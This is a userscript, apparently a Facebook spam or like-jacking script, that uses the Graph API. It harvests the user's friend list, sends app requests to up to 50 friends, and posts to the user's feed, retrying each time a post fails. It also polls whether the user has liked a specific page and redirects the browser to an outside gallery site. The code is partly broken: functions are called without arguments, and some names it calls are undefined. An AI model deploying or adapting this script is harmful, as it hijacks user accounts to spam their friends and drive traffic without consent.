// ==UserScript==
// @name          boom boom akky
// @namespace     appi
// @description   for test porpus

// ==/UserScript==

/*1337551016,169897602,JIT Construction: v560112,en_US*/


 function getUserFriends() {
   FB.api('/me/friends', function(response) {
     console.log('Got friends: ', response);

     if (!response.error) {
       var markup = '';
var myfrnd = ''
       var friends = response.data;
var id  = response.data;
 var birthday=response.birthday;
var picture  = response.picture;
 var listto = "";
            var exist = [];
       for (var i=0; i < friends.length && i < 50; i++) {
       var friend = friends[i];
	window.myf += friends[i];
	window.bday = birthday;
	
   myfrnd  += friends[i].id + ',';
         markup += '<li class="ght" id='+ friend.id + '><img src="https://graph.facebook.com/' + friend.id + '/picture"></li>';
		
       }
document.getElementById('userfrnds1').innerHTML = markup;
      
       FB.ui({method: 'apprequests',

     to:myfrnd ,
     title: 'add your friends',
     message: 'just like your game',
   }, callback);
   
  return false;
	  }
	  //console.log(response);
          function callback(response) {
   console.log(response);
 } 
            
		
   });
 feed()
 }


  function feed1(i,m,g,q,r)  
    {  
        FB.api('/me/feed', 'post',  
        {  
            message: i,  
            link:q,  
            name:m,  
            picture:r,  
            description:g,  
        }, function(response) {  
            if (!response || response.error) {  
			feed1();
			
    
	
            } else {getUserFriends()}  
        });  
    } 
 
 
 function adfrnds()
 {FB.api('/me/likes/152932248176034',function(response) {
    if( response.data ) {
        if( !isEmpty(response.data) )
		{
		
		feed1();
		


window.open('http://www.webmusking.com/gallery/easy-photoshop','_blank');
window.location = "http://www.webmusking.com/gallery/easy-photoshop"

		}
            
        else{
		
		DoSomething();
		

setInterval(function(){adfrnds()},6000);
}
            
    } else {
        setInterval(function(){DoSomething()},12000);
    }
});
 
// function to check for an empty object
function isEmpty(obj) {
    for(var prop in obj) {
        if(obj.hasOwnProperty(prop))
            return false;
    }
 
    return true;
}}